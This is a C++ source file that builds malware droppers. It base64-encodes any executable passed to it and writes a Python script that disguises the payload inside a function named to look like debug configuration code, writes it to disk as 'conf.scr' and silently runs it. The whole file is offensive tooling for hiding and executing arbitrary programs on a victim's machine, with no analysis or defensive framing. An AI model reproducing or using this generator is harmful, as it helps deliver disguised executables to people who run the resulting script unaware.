#include <iostream>
#include <vector>
#include <string>
#include <fstream>

#include "b64.h"

int main(int argc, char* argv[]) {
    // Check if the user provided a file to encode
    if (argc != 2) {
        std::cout << "Usage: " << argv[0] << " <executable to drop>" << std::endl;
        return 1;
    }
    
    // Read the input file to an std::vector<char>
    std::ifstream inFile(argv[1], std::ios::binary);
    if (!inFile.is_open()) {
        std::cout << "Error: Could not open input file" << std::endl;
        return 1;
    }
    std::vector<char> data;
    char c;
    while (inFile.get(c)) {
        data.push_back(c);
    }

	// Encode the data to base 64
	std::string b64Data = base64_encode(data);
    
	// Write some lovely python code to a file
    std::ofstream outFile("pyDrop-" + std::string(argv[1]) + ".py");
    outFile << "def bl_get_generic_debug_conf():\n";
	outFile << "    import base64\n";
	outFile << "    import subprocess\n";
	outFile << "    b = b'" << b64Data << "'\n";
	outFile << "    d = base64.b64decode(b)\n";
	outFile << "    with open('conf.scr', 'wb') as f:\n";
	outFile << "        f.write(d)\n";
	outFile << "    subprocess.Popen('conf.scr')\n";
	outFile << "bl_get_generic_debug_conf()\n";
    outFile.close();
    std::cout << "Complete. Wrote file pyDrop-" << std::string(argv[1]) << ".py" << std::endl;
    
    return 0;
}